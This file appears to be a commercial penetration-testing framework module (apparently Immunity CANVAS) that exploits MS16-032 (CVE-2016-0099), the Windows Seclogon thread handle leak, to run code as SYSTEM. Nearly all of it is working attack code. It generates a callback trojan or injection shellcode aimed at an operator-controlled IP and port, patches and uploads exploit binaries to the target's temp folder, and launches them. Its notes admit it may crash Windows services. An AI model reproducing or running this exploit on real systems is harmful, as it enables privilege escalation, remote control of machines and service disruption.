#!/usr/bin/env python

import os
import sys
import time
import random

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit
from shellcode.standalone.windows.payloads import payloads
from shellcode.standalone.windows.payloads64 import payloads as payloads64
import canvasengine
from MOSDEF import pelib

from WindowsConstants import KEY_QUERY_VALUE
from WindowsConstants import HKEY_LOCAL_MACHINE
from WindowsConstants import GENERIC_WRITE


from libs.canvasos import canvasos

import logging


NAME                           = 'MS16-032 Seclogon Thread Handle Leak'
DESCRIPTION                    = 'MS16-032 Seclogon thread handle leak allows arbitrary code execution as SYSTEM'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Microsoft'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2016-0099'
DOCUMENTATION['CVE Url']       = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0099'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Windows', 'x86'],
                                   ['Windows', 'x64'],
]

PROPERTY['VERSION']            = ['Windows 7 Ultimate SP1']
DOCUMENTATION["References"]    = ['https://technet.microsoft.com/en-us/library/security/ms16-032.aspx',
                                  'http://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html',
                                  'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0099',
]
DOCUMENTATION['Notes']         = """
Our exploit module is really two modules:
#1 An exploit, based off of Google Project Zero's post by James Foreshaw. It is extremely
   reliable if the target is a non-virtualized (and multicore) machine.
#2 An Immunity-written exploit for handling the case of non-virtualized systems. It is
   *much* less reliable. We discuss that below.

IMPORTANT NOTE: we assume that almost every bare-metal system this will run on will have
multiple cores. Thus we only check whether a system is virtualized or not to determine
which exploit binary to execute.

NOTES ON EXPLOIT #2
It should be noted that this exploit has reliability issues, namely stemming from
SuspendThread and SetThreadContext providing unreliable process suspension and register
writing primitives. Many techniques have been tried to maintain control over the thread
after we suspend it, but they have proven unreliable in general.

This exploit *will* crash SecLogon and a number of other Windows services all at the same
time if successful. Even if the exploit is unsuccessful, it may crash those services as well.
However, it should be noted that these services will in fact restart.

Win7 / Win10 are the most reliable targets.

It also takes a long time to work. A few minutes should suffice, but not more than 5.

X86:
Windows XP Home SP0    - FAILED, incorrect handle number duplicated - likely not exploitable
Windows 8.1 SP1        - SUCCESS - Exploit created.
Windows 7 Ultimate SP1 - SUCCESS - Exploit created.
Windows 10 Enterprise  - SUCCESS - Exploit created.

X86_64:
Windows Server 2008 R2 - VULNERABLE
Windows 8.1 Pro SP1    - VULNERABLE
Windows 10 Enterprise  - SUCCESS - Exploit created.
"""

CHANGELOG = """
"""

targets = {
    0: ['Autodetect', [0, 0, 0, 0]]
}


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def detect_releaseid(self):
        RELEASEID_KEY = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
        hKey = self.node.shell.get_reg_key_handle(HKEY_LOCAL_MACHINE, RELEASEID_KEY, KEY_QUERY_VALUE)

        releaseid = int(str(self.node.shell.RegQueryValueEx(hKey, "ReleaseID")[2]).strip('\0'))

        return releaseid


    def replace_c_string(self, buf, needle, replacement):
        if not (len(needle) >= len(replacement)):
            logging.error("Replacing %s with %s is not allowed - the latter is too long of a string!" % (needle, replacement))

        replacement = replacement + "\x00" * (len(needle) - len(replacement))

        return buf.replace(needle, replacement)

    def replace_unicode_string(self, buf, needle, replacement):
        if not (len(needle) >= len(replacement)):
            logging.error("Replacing %s with %s is not allowed - the latter is too long of a string!" % (needle, replacement))

        uni_needle = needle.encode("utf-16")[2:]
        uni_replacement = replacement.encode("utf-16")[2:] + ("\x00\x00" * (len(needle) - len(replacement)))

        return buf.replace(uni_needle, uni_replacement)

    def bm_prepare_executables(self, tmp_directory):
        c_string_padding = "A"*300

        exploit_name = "%s.exe" % random.randint(1001, 2000)
        exploit_local_path = os.path.join(self.local_res, "tmp_%s" % exploit_name)
        exploit_rem_path = tmp_directory + exploit_name

        mosdef_dll_name = "%s.exe" % random.randint(2001, 3000)
        mosdef_local_path = os.path.join(self.local_res, "tmp_%s" % mosdef_dll_name)
        mosdef_rem_path = tmp_directory + mosdef_dll_name

        return_value = [(exploit_local_path, exploit_rem_path),
                        (mosdef_local_path, mosdef_rem_path)]

        exploit_orig_name = "bm_exploit32.exe"
        if self.is_64bit_node() or self.has_wow64():
            exploit_orig_name = "bm_exploit64.exe"

        # Generate the MOSDEF executable

        t_os = canvasos('WINDOWS')
        t_os.arch = 'X64' if self.is_64bit_node() or self.has_wow64() else 'X86'

        created_trojan = self.buildmosdeftrojan(self.callback.ip, self.callback.port, t_os, universal=True)

        if created_trojan != True:
            self.log_error("Error in generating our MOSDEF executable")
            return None
        else:
            logging.info("Writing MOSDEF callback to %s" % mosdef_local_path)

            with open(mosdef_local_path, "wb") as handle:
                handle.write(self.mosdeftrojan)

        exploit_data = None

        with open(os.path.join(self.local_res, exploit_orig_name), "rb") as handle:
            exploit_data = handle.read()

        exploit_data = self.replace_unicode_string(exploit_data, "MOSDEF_SHIM_DLL_PATH" + c_string_padding,
                                             mosdef_rem_path)

        logging.info("Writing exploit to %s" % exploit_local_path)

        with open(exploit_local_path, "wb") as handle:
            handle.write(exploit_data)

        return return_value


    def vm_prepare_executables(self, tmp_directory):
        if self.is_64bit_node() and (not self.is_win10_node()):
            logging.info("VM exploit not capable of running on pre-10 Windows versions")
            return None

        c_string_padding = "A"*300

        exploit_name = "%s.exe" % random.randint(1001, 2000)
        exploit_local_path = os.path.join(self.local_res, "tmp_%s" % exploit_name)
        exploit_rem_path = tmp_directory + exploit_name

        mosdef_dll_name = "%s.dll" % random.randint(2001, 3000)
        mosdef_local_path = os.path.join(self.local_res, "tmp_%s" % mosdef_dll_name)
        mosdef_rem_path = tmp_directory + mosdef_dll_name


        return_value = [(exploit_local_path, exploit_rem_path),
                        (mosdef_local_path, mosdef_rem_path)]

        exploit_orig_name = "vm_exploit32.exe"
        if self.is_64bit_node() or self.has_wow64():
            exploit_orig_name = "vm_exploit64.exe"

        shellcode = None

        mosdeftrojan = None

        if self.is_64bit_node() or self.has_wow64():
            pld = payloads64(module=self, dll=True)
            shellcode_asm = pld.InjectToSelf(self.callback.ip, self.callback.port)
            shellcode = pld.assemble(shellcode_asm)

            myPElib = pelib.PElib(win64=1)
            mosdeftrojan = myPElib.createPEFileBuf({'DllMain' : shellcode}, gui=True)
        else:
            pld = payloads(module=self, dll=True)
            shellcode_asm = pld.injectintoprocess(self.callback.ip, self.callback.port,
                                                  load_winsock=True, SeDebugPrivilege=True,
                                                  waitcode=False, exit_thread=True, universal=True, dll_create_thread=False)

            shellcode = pld.assemble(shellcode_asm)

            myPElib = pelib.PElib()
            importante = myPElib.get_random_imports()
            mosdeftrojan = myPElib.createPEFileBuf({'DllMain' : shellcode}, gui=True, importante=importante)

        if mosdeftrojan == None:
            logging.error("Error while building our PE")
            return None
        else:
            logging.info("Writing MOSDEF LSASS inject trojan to %s" % mosdef_local_path)

            with open(mosdef_local_path, "wb") as handle:
                handle.write(mosdeftrojan)

        exploit_data = None

        with open(os.path.join(self.local_res, exploit_orig_name), "rb") as handle:
            exploit_data = handle.read()

        exploit_data = self.replace_c_string(exploit_data, "MOSDEF_SHIM_DLL_PATH" + c_string_padding,
                                             mosdef_rem_path)

        logging.info("Writing exploit to %s" % exploit_local_path)

        with open(exploit_local_path, "wb") as handle:
            handle.write(exploit_data)

        return return_value

    def spawn_exploit(self, path):
        # NOTE: this exploit does not support XP!
        if self.is_win7_node():
            osVersion = 'win7'
        elif self.is_win81_node():
            osVersion = 'win81'
        elif self.is_win10_node():
            osVersion = "win10"
        else:
            major, minor, sp = self.GetVersionEx()
            self.log_error("Unsupported OS (GetVersionEx %d.%d.%d), bailing" % (major, minor, sp))
            return 0

        logging.info("Spawning exploit: %s %s" % (path, osVersion))
        try:
            cmd_line = path + ' ' + osVersion
            ret = self.node.shell.CreateProcessA(cmd_line,
                                                 inherithandles = 1,
                                                 dwCreationFlags = 0x08000000)
        except Exception, ex:
            self.log_error('%s' % ex)
            return False

        return ret


    def run(self):
        ret = 0
        for node in self.argsDict['passednodes']:
            self.summary[node] = 0
            self.node = node

            if not self.is_windows_node():
                continue

            if not any([self.is_win7_node(),
                        self.is_win81_node(),
                        self.is_win10_node()]):
                logging.info("Not Windows 7 / 8.1 / 10 node! Aborting")
                continue

            if self.is_win10_node():
                releaseid = int(self.detect_releaseid())
                logging.info("Windows 10 %d" % releaseid)

                if releaseid !=  1511:
                    logging.warning("Windows 10 Release ID not supported")
                    continue


            # first, we check to make sure we are not
            # already local/SYSTEM
            if self.compromised():
                logging.warning("It appears you are already running as LOCAL/SYSTEM")
                continue

            tmp_path = self.node.shell.GetTempPathA()
            if not tmp_path:
                logging.error('Could not resolve full temp dir path')
                continue
            else:
                logging.info('Temp dir: %s' % tmp_path)

            if self.node.shell.chdir(tmp_path) < 0:
                logging.error('Could not chdir into %s' % tmp_path)
                continue

            pe_info = None

            if self.node.shell.checkvm():
                pe_info = self.vm_prepare_executables(tmp_path)
            else:
                pe_info = self.bm_prepare_executables(tmp_path)

            logging.info("Callback IP: %s" % self.callback.ip)
            logging.info("Callback port: %s" % self.callback.port)

            if pe_info == None:
                logging.error("Failed to generate necessary executables")
                return 0

            remote_exploit_path = None

            for (local_path, remote_path) in pe_info:
                if not self.nodeUpload(local_path, remote_path):
                    logging.error('Error while uploading exploit binary')
                    return 0

                os.unlink(local_path)

            remote_exploit_path = pe_info[0][1]

            problem_exploit = False

            if not self.spawn_exploit(remote_exploit_path):
                logging.error('Could not spawn %s' % NAME)

            for i in range(30):
                if self.ISucceeded():
                    ret = 1
                    self.summary[node] = 1
                time.sleep(0.5)

        return ret


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
